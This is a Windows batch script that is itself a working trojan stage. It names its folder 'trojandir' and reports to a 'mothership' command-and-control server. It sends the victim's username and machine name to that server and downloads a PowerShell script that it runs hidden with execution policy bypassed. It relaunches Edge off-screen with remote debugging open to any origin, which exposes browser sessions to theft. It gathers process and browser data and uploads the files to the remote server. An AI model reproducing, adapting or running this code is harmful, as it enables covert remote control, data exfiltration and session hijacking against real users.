REM jobcode set by retrieve.php

set /a error_code=0

set sessionid=99%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%
set batchid=%sessionid%

SET "trojandir=%temp%\owd"

IF NOT EXIST %trojandir% (
    goto :error_owd_folder_missing
)

set clientid=xxxxxxxx

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

SET "timestamp=%tt:~0,14%%tt:~15,4%"

cd /d %trojandir%
        
set workdir=%trojandir%\cmdlist_%timestamp%

md %workdir%

cd /d %workdir%
    
set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"


echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username
set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set scriptfullpath=%~f0
set source=%~nx0

set params=
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%"
set params=%params% --data-urlencode "username=%username%"
set params=%params% --data-urlencode "machinename=%machinename%"
set params=%params% --data-urlencode "clientid=%clientid%"

set mothership=https://darksalmon-crow-356809.hostingersite.com
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=start_job" %params%

set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"

REM ----------

set msg=setup done
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ------ modify msedge

curl -ks -o %trojandir%\modify_edge_lnk.ps1 -G %mothership%/ow/assets/modify_edge_lnk.ps1

IF EXIST %trojandir%\modify_edge_lnk.ps1 (
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1 > %workdir%\ps_log.log 2>&1
)

REM --- start msedge

taskkill /F /IM msedge.exe

start msedge --new-window "https://www.google.com/" --profile-directory=Default --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session --window-position=2000,2000 --window-size=50,50

REM ---

set "key=HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
set "val=ProgId"

echo ChromeHTML > %workdir%\reg_query_browser.txt
reg query "%key%" /v "%val%" | findstr /i "ChromeHTML" >> %workdir%\reg_query_browser.txt 2>&1

echo IE.Assoc >> %workdir%\reg_query_browser.txt
reg query "%key%" /v "%val%" | findstr /i "IE.Assoc" >> %workdir%\reg_query_browser.txt 2>&1

REM ---

wmic process list full /format:csv > %workdir%\wmic_process.csv
tasklist /v /fo csv > %workdir%\task_list.txt


REM ---------- upload artifacts

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

cd /d %workdir%

SETLOCAL ENABLEDELAYEDEXPANSION

FOR %%F IN ("*") DO (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=uploading %%F" %params%

    curl -X POST --data-binary "@%%F" %mothership%/ow/upload.php?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&machinename=%machinename%^&username=%username%
)
ENDLOCAL

REM ---


echo finished >> %logfpath%
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

:error_RunHiddenPSx_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

set msg=errors occurred while executing %source% error_code %error_code%
echo %msg% >> %logfpath%

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" %params%

exit
